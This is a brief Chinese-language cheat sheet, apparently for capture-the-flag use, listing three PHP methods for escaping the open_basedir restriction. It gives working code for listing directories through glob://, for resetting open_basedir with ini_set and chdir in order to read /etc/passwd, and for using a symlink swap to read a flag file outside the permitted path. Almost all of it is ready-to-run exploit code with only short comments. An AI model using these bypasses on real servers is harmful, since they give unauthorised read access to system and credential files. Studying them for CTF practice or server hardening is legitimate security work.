# open_basedir 绕过方法
## 方法 1: glob:// 协议列目录

```php
<?php
// open_basedir 不限制 glob://
$it = new DirectoryIterator("glob:///f*");  // 列出 / 下 f 开头的文件
foreach($it as $f) echo $f . "\n";

// 逐层探索
$it = new DirectoryIterator("glob:///var/www/*");
foreach($it as $f) echo $f . "\n";
?>
```

## 方法 2: ini_set 重设

```php
<?php
// 某些 PHP 版本可通过 ini_set 扩展 open_basedir
mkdir("/tmp/test");
chdir("/tmp/test");
ini_set("open_basedir", "..");
chdir("..");
chdir("..");
chdir("..");
ini_set("open_basedir", "/");
echo file_get_contents("/etc/passwd");
?>
```

## 方法 3: symlink 绕过

```php
<?php
// 创建符号链接跳出 open_basedir
symlink("/var/www/html/a/b/c/d", "/tmp/tmplink");
symlink("/tmp/tmplink/../../../../flag.txt", "/tmp/exploit");
unlink("/tmp/tmplink");
mkdir("/tmp/tmplink");
echo file_get_contents("/tmp/exploit");
?>
```
